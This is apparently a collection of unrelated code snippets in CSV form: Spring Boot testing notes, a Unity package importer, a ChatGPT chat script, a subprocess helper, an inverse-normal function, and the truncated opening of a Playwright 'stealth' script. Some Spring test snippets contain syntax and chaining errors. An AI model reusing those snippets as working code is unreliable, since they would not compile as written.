name,code
// To to integration testing with Spring, all components of the application have to be configured and wired up.
// Instead of doing this by hand we can use Spring's SpringJUnit4ClassRunner.
// It helps load a Spring application context in JUnit-based application tests.
// This method with the @ContextConfiguration annotation doesn't apply extenal properites (application.properties) and logging
// @ContextConfiguration specifies how to load the application context: A configuraiton class is passed to it as a parameter
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes=PlaylistConfiguration.class)
public class PlaylistServiceTests {


 @Autowired
 private PlaylistService playlistService;


 @Test
 public void testService() {
 Playlist playlist = playlistService.findByName(""X-Mas Songs"");
 assertEquals(""X-Mas Songs"", playlist.getName());
 assertEquals(12, playlist.countSongs());
  }
}


// Integration test by loading application context + external properties + logging
// Replace the @ContextConfiguration with @SpringApplicationConfiguration
// This loads the application just like the application context would be loaded by using SpringApplication
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes=PlaylistConfiguration.class)
public class PlaylistServiceTests {
  ...
}


// Test controller classes
//
// > Either by mocking the servlet container and without starting an application server
// > Or by starting the embedded servlet container (e.g. tomcat) and exercise tests in a real application server


// Test controller classes with Spring's Mock MVC framework
//
// First create a MockMvc Object with the MockMvcBuilders
// standaloneSetup()	- Builds a Mock MVC to serve one ore more manually created controllers
//                  	  so that the controller instances have to be instantiated manually.
//                        It is more like a unit test for very focused tests around a single controller.
// webAppContextSetup() - Builds a Mock MVC using a Spring application context which includes one ore more controllers
//                        using an instance of WebApplicationContext.
//                        Spring will load the controllers as well as their dependencies.
//                        Therefore the test class has to be annotated with @WebAppConfiguration
// 			  to declare that the application context created by the SpringJUnit4ClassRunner
// 			  should be an WebApplicationContext and not the basic non-web ApplicationContext.
//			  The webAppContextSetup() method takes an instance of the WebApplicationContext as a parameter.
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebAppConfiguration
public class MockMvcWebTests {
 @Autowired
 private WebApplicationContext webContext;


 private MockMvc mockMvc;


 @Before
 public void setupMockMvc() {
 mockMvc = MockMvcBuilders
      .webAppContextSetup(webContext)
      .build();
  }


 @Test
 public void playlist() throws Exception {
 mockMvc.perform(MockMvcRequestBuilders.get(""/playlist""))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.view().name(""playlist""))
      .andExpect(MockMvcResultMatchers.model().attributeExists(""songs""))
      .andExpect(MockMvcResultMatchers.model().attribute(""songs"",
 Matchers.is(Matchers.empty())));
  }
}


// The playlist() method can be rewritten with static imports
@Test
public void playlist() throws Exception {
 mockMvc.perform(get(""/playlist""))
    .andExpect(status().isOk())
    .andExpect(view().name(""playlist""))
    .andExpect(model().attributeExists(""songs""))
    .andExpect(model().attribute(""songs"", is(empty())));
}


// Test method with HTTP POST request
@Test
public void postSong() throws Exception {
 mockMvc.perform(post(""/playlist""))
    .contentType(MediaType.APPLICATION_FORM_URLENCODED)
    .param(""interpret"", ""OutKast"")
    .param(""title"", ""Hey Ya!"")
    .andExpect(status().is3xxRedirection())
    .andExpect(header().string(""Location"", ""/playlist""));


 // Create expected song
 Song expectedSong = new Song();
 expectedSong.setId(1L);
 expectedSong.setInterpret(""OutKast"");
 expectedSong.setTitle(""Hey Ya!"");


 // Check if new song is in playlist
 mockMvc.perform(get(""/playlist""))
    .andExpect(status().isOk())
    .andExpect(view().name(""playlist""))
    .andExpect(model().attributeExists(""songs""))
    .andExpect(model().attribute(""songs"", hasSize(1)))
    .andExpect(model().attribute(""songs"",
 contains(samePropertyValuesAs(expectedSong))));
}


// Testing with Spring Security
// First add the testCompile dependency
testCompile(""org.springframework.security:spring-security-test"")


// Apply the Spring Security configurer when creating the MockMvc instance
// SecurityMockMvcConfigurers.springSecurity() - returns a Mock MVC configurer that enables Spring Security for Mock MVC
@Before
public void setupMockMvc() {
 mockMvc = MockMvcBuilders
    .webAppContextSetup(webContext)
    .apply(springSecurity())
    .build();
}


// Test without being authenticated
@Test
public void unauthenticated() throws Exception() {
 mockMvc.perform(get(""/""))
    .andExpect(status().is3xxRedirection())
    .andExpect(header().string(""Location"",
 ""http://localhost/login""));
}


// There are two ways to use an authenticated user for the tests
// @WithMockUser - Loads the security with a UserDetails using the given username, password and authorization
// @WithUserDetails - Loads the security context by looking up a UserDetails object for the given username
// This UserDetails object is being used for the duration of the test method


// Bypassing the normal lookup of a UserDetails object and instead create one
@Test
@WithMockUser(
 username=""clark"",
 password=""kent123"",
 roles=""USER""
)
public void authenticatedUser() throws Exception {
  ...
}


// Using a real user from a UserDetailsService
@Test
@WithUserDetails(""clark"")
public void authenticatedUser() throws Exception {
 PlaylistOwner expectedPlaylistOwner = new PlaylistOwner();
 expectedPlaylistOwner.setUsername(""clark"");
 expectedPlaylistOwner.setPassword(""kent123"");
 expectedPlaylistOwner.setFullname(""Clark Kent"");


 mockMvc.perform(get(""/""))
    .andExpect(status().isOk())
    .andExpect(view().name(""playlist""))
    .andExpect(model().attribute(""owner"",
 samePropertyValuesAs(expectedPlaylistOwner)))
    .andExpect(model().attribute(""songs"", hasSize(0)));
}


// Test with a real application server (embedded tomcat)
// @WebIntegrationTest declares that you not only want an application context
// but also to start an embedded servlet container
// You can use Spring's RestTemplate to perform HTTP requests against the application
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebIntegrationTest
public class RealWebTest {


 @Test (expected=HttpClientErrorException.class)
 public void pageNotFound() {
 try {
 RestTemplate rest = new RestTemplate();
 // Perform GET request
 rest.getForObject(""http://localhost:8080/ladida"", String.class);
 fail(""Should result in HTTP 404"");
    } catch (HttpClientErrorException e) {
 assertEquals(HttpStatus.NOT_FOUND, e.getStatusCode());
 throw e;
    }
  }
}


// Start the server an a random port with ""random=true"" and inject actual port value
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebIntegrationTest(randomPort=true)
public class RealWebTest {


 @Value(""${local.server.port}"")
 private int port;


 @Test (expected=HttpClientErrorException.class)
 public void pageNotFound() {
    ...
 rest.getForObject(""http://localhost:{port}/ladida"", String.class, port);
    ...
  }
}


// Test Frontend with Selenium
// First add Selenium as a testCompile dependency
testCompile(""org.seleniumhq.selenium:selenium-java:2.52.0"")


// Write a test class with a FirefoxDriver
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebIntegrationTest(randomPort=true)
public class SeleniumWebTest {


 private static FirefoxDriver browser;


 @Value(""${local.server.port}"")
 private int port;


 @BeforeClass
 public static void openBrowser() {
 browser = new FirefoxDriver();
 browser.manage().timeouts()
      .implicitlyWait(10, TimeUnit.SECONDS);
  }


 @AfterClass
 public static void closeBrowser() {
 browser.quit();
  }


 @Test
 public void addSongToEmptyPlaylist() {
 String baseUrl = ""http://localhost:"" + port;


 browser.get(baseUrl);


 assertEquals(""You have no songs in your playlist"",
 browser.findElementByTagName(""div"").getText());


 browser.findElementByName(""interpret"")
      .sendKeys(""OutKast"");
 browser.findElementByName(""title"")
      .sendKeys(""Hey Ya!"");
 browser.findElementByTagName(""form"")
      .submit();


 WebElement dl = browser.findElementByCssSelector(""dt.songHeadline"");
 assertEquals(""OutKast - Hey Ya!"", dl.getText());


 WebElement dt = browser.findElementByCssSelector(""dd.songTitle"");
 assertEquals(""Hey Ya!"", dt.getText());
  }
}


// Execute Code on Startup (and refresh) of the application
@Component
public class MyListener implements ApplicationListener<ApplicationReadyEvent> {


 @Override
 public void onApplicationEvent(ApplicationReadyEvent event) {
 // doStuff();
  }
}


// Run Flyway migrations on In-Memory DB for an integration test (written in Groovy with Spock)
@SpringBootTest
@AutoConfigureTestDatabase
@ImportAutoConfiguration(FlywayAutoConfiguration.class)
@TestPropertySource(properties = [
 ""flyway.enabled=true"",
 ""spring.jpa.hibernate.ddl-auto=none""
])
class MySpec extends Specification {
 def ""foo""() {
    // do something...
  }
}

// Force a fresh version of the Spring context before each test method executes
@SpringBootTest
@DirtiesContext(classMode = ClassMode.BEFORE_EACH_TEST_METHOD)
class MySpec extends Specification {
  def ""foo""() {
    // do something...
  }
}

// Application events are sent in the following order, as your application runs:
1. ApplicationStartedEvent is sent at the start of a run, but before any processing except the registration of listeners and initializers.
2. ApplicationEnvironmentPreparedEvent is sent when the Environment to be used in the context is known, but before the context is created.
3. ApplicationPreparedEvent is sent just before the refresh is started, but after bean definitions have been loaded.
4. ApplicationReadyEvent is sent after the refresh and any related callbacks have been processed to indicate the application is ready to service requests.
5. ApplicationFailedEvent is sent if there is an exception on startup.
 
// Configure Loglevel from Lombok's @Slf4j Annotation via application.properties
@SpringBootApplication
@Slf4j
public class MyApp {
  public static void main(String[] args) {
    SpringApplication.run(MyApp.class, args);
    log.info(""testing logging with lombok"");
  }
}


// application.properties
logging.level.com.example.MyApp=WARN


// Recommended structuring of a Spring Boot application
com
 +- example
     +- myproject
         +- Application.java
         |
         +- domain // Entities + Repos
         |   +- Customer.java
         |   +- CustomerRepository.java
         |
         +- service
         |   +- CustomerService.java
         |
         +- web
             +- CustomerController.java
 
// Show debug logs from Spring
logging.level.root=debug
==<SEPERATOR>==
ImportAssets.cs
using System.Collections.Generic;
using System.IO;
using UnityEngine;
using UnityEditor;
using UnityEditor.PackageManager.Requests;
using UnityEditor.PackageManager;


// Place this script in YOUR_PROJECT_FOLDER/Assets/Editor
// Run this script by clicking on the Importer menu item below the Unity title bar (File, Edit ... Importer)
public class ImportAssets : EditorWindow {
 static string unityPackagesPath = ""C:/Users/user/Downloads/UnityAssets"";


 static AddRequest Request;
 static int index = 0;


 // Add the packages you want to install here.
 // Package versions and names can be obtained by opening the package manager
 // then clicking on the package you are interested in and clicking on ""view changelog""
 // A browser window will open with a URL similar to the following:
 // https://docs.unity3d.com/Packages/com.unity.2d.animation@5.0/changelog/CHANGELOG.html
 // Obtain the name and the version from the string between Packages/ ... /changelog
 // Omitting the version will install the latest version available.
 // Specific versions can be installed by adding the version after the package name:
 // com.unity.visualeffectgraph@10.2
 // package.name@version
 static List<string> packages = new List<string> {
 ""com.unity.textmeshpro"",
 ""com.unity.shadergraph"",
 ""com.unity.visualeffectgraph"",
 ""com.unity.terrain-tools"",
 ""com.unity.polybrush"",
 ""com.unity.postprocessing"",
 ""com.unity.cinemachine""
 };


 [MenuItem(""Importers/Asset Importer"")]
 public static void ImportAllAssets() {
 string[] unityPackages = Directory.GetFiles(unityPackagesPath);


 for(int i = 0; i < unityPackages.Length; i++) {
 if(unityPackages[i].EndsWith("".unitypackage"")) {
                AssetDatabase.ImportPackage(unityPackages[i], false);
 }
 }


        Debug.Log(""Assets have been imported"");
 }


 // Example of a for loop through methods rather than the for loop built into the language.
 [MenuItem(""Importers/Smart Package Importer"")]
 public static void SmartImportAllPackages() {
 if(index >= packages.Count) { return; }


 Request = Client.Add(packages[index]);
        EditorApplication.update += Progress;


 index++;
 }


 static void Progress() {
 if(Request.IsCompleted) {
 if(Request.Status == StatusCode.Success)
                Debug.Log(""Installed: "" + Request.Result.packageId);
 else if(Request.Status >= StatusCode.Failure)
                Debug.Log(Request.Error.message);


            EditorApplication.update -= Progress;


 if(index >= packages.Count) {
                Complete();
 } else {
                SmartImportAllPackages();
 }
 }
 }


 static void Complete() {
        Debug.Log(""Completed importing all packages."");
 Request = null;
 index = 0;
 }


 [MenuItem(""Importers/Dumb Package Importer"")]
 public static void DumbImportAllPackages() {
 // NOTE: This will freeze the editor. Please wait until the process has completed.
 while(index != packages.Count) {
 Request = Client.Add(packages[index]);


 while(!Request.IsCompleted) {
                System.Threading.Thread.Sleep(2000);
 }


 if(Request.Status == StatusCode.Success)
                Debug.Log(""Installed: "" + Request.Result.packageId);
 else if(Request.Status >= StatusCode.Failure)
                Debug.Log(Request.Error.message);


 index++;
 }


        Complete();
 }
}
"
"UseCase.java
","public sealed interface UseCase {
 interface Result {}


 interface Argument {}


 interface FunctionArgument<R extends Result> extends Argument {}


 non-sealed interface Function<
 A extends FunctionArgument<R>, R extends Result
  >
 extends UseCase, java.util.function.Function<A, R> {}


 non-sealed interface Consumer<A extends Argument>
 extends UseCase, java.util.function.Consumer<A> {}


 non-sealed interface Supplier<R extends Result>
 extends UseCase, java.util.function.Supplier<R> {}


 non-sealed interface Runnable extends UseCase, java.lang.Runnable {}
}
"
"chatgpt.py
","import os
import sys
from dotenv import load_dotenv
import openai # pip install openai
import re


# Load the API key from the .env file
load_dotenv()


# Get the API key from the environment variable
api_key = os.environ.get(""OPENAI_API_KEY"")
org_id = os.environ.get(""OPENAI_ORG_ID"")
model_engine = os.getenv(""MODEL_ENGINE"")


# bail if no API key, org or model engine
#if api_key is None or org_id is None or model_engine is None:
#    print(""Please set the environment variables OPENAI_API_KEY, OPENAI_ORG_ID and MODEL_ENGINE"")
#    sys.exit()


openai.api_key = api_key
openai.organization = org_id


messages = []
system_msg = input(""\n\033[33mWhat type of chatbot would you like to create?\033[0m \n\n> "")
messages.append({""role"": ""system"", ""content"": system_msg})


print(""\n"")


#print(""Say hello to your new assistant!\n"")
user_input = """"
chat_history = ""System: "" + system_msg




while user_input != ""!endchat"": 
 user_input = input(""\033[31mYou: \033[0m"")
 if user_input == ""!endchat"":
 break


 messages.append({""role"": ""user"", ""content"": user_input})
 response = openai.ChatCompletion.create(
 model=model_engine,
 messages=messages)


 reply = response[""choices""][0][""message""][""content""]
 messages.append({""role"": ""assistant"", ""content"": reply})
 chat_history += f""\nUser: {user_input}\nChatGPT: {reply}\n""
 print(""\n\033[31m"" + ""Bot:\033[0m "" + reply + ""\n"")


chat_log = input(""\n\nPlease enter a filename to save the chat log to (without the .log extension): "")
with open(f""{chat_log}.log"", ""w"") as f:
 f.write(re.sub(""\033\[\d+m"", """", chat_history))
==<SEPERATOR>==
capture-and-print-subprocess-output.py
import io
import selectors
import subprocess
import sys


def capture_subprocess_output(subprocess_args):
 # Start subprocess
 # bufsize = 1 means output is line buffered
 # universal_newlines = True is required for line buffering
 process = subprocess.Popen(subprocess_args,
 bufsize=1,
 stdout=subprocess.PIPE,
 stderr=subprocess.STDOUT,
 universal_newlines=True)


 # Create callback function for process output
 buf = io.StringIO()
 def handle_output(stream, mask):
 # Because the process' output is line buffered, there's only ever one
 # line to read when this function is called
 line = stream.readline()
 buf.write(line)
 sys.stdout.write(line)


 # Register callback for an ""available for read"" event from subprocess' stdout stream
 selector = selectors.DefaultSelector()
 selector.register(process.stdout, selectors.EVENT_READ, handle_output)


 # Loop until subprocess is terminated
 while process.poll() is None:
 # Wait for events and handle them with their registered callbacks
 events = selector.select()
 for key, mask in events:
 callback = key.data
 callback(key.fileobj, mask)


 # Get process return code
 return_code = process.wait()
 selector.close()


 success = (return_code == 0)


 # Store buffered output
 output = buf.getvalue()
 buf.close()


 return (success, output)
==<SEPERATOR>==
NormSInv.js
function NormSInv(p) {
 var a1 = -39.6968302866538, a2 = 220.946098424521, a3 = -275.928510446969;
 var a4 = 138.357751867269, a5 = -30.6647980661472, a6 = 2.50662827745924;
 var b1 = -54.4760987982241, b2 = 161.585836858041, b3 = -155.698979859887;
 var b4 = 66.8013118877197, b5 = -13.2806815528857, c1 = -7.78489400243029E-03;
 var c2 = -0.322396458041136, c3 = -2.40075827716184, c4 = -2.54973253934373;
 var c5 = 4.37466414146497, c6 = 2.93816398269878, d1 = 7.78469570904146E-03;
 var d2 = 0.32246712907004, d3 = 2.445134137143, d4 = 3.75440866190742;
 var p_low = 0.02425, p_high = 1 - p_low;
 var q, r;
 var retVal;


 if ((p < 0) || (p > 1))
 {
 alert(""NormSInv: Argument out of range."");
 retVal = 0;
 }
 else if (p < p_low)
 {
 q = Math.sqrt(-2 * Math.log(p));
 retVal = (((((c1 * q + c2) * q + c3) * q + c4) * q + c5) * q + c6) / ((((d1 * q + d2) * q + d3) * q + d4) * q + 1);
 }
 else if (p <= p_high)
 {
 q = p - 0.5;
 r = q * q;
 retVal = (((((a1 * r + a2) * r + a3) * r + a4) * r + a5) * r + a6) * q / (((((b1 * r + b2) * r + b3) * r + b4) * r + b5) * r + 1);
 }
 else
 {
 q = Math.sqrt(-2 * Math.log(1 - p));
 retVal = -(((((c1 * q + c2) * q + c3) * q + c4) * q + c5) * q + c6) / ((((d1 * q + d2) * q + d3) * q + d4) * q + 1);
 }


 return retVal;
}
"
"playwright-stealth.js
","const pw = require('playwright');
const UserAgent = require('user-agents');
const uuid = require('uuid');
const tmp = require('tmp-promise');


const UINT32_MAX = (2 ** 32) - 1;
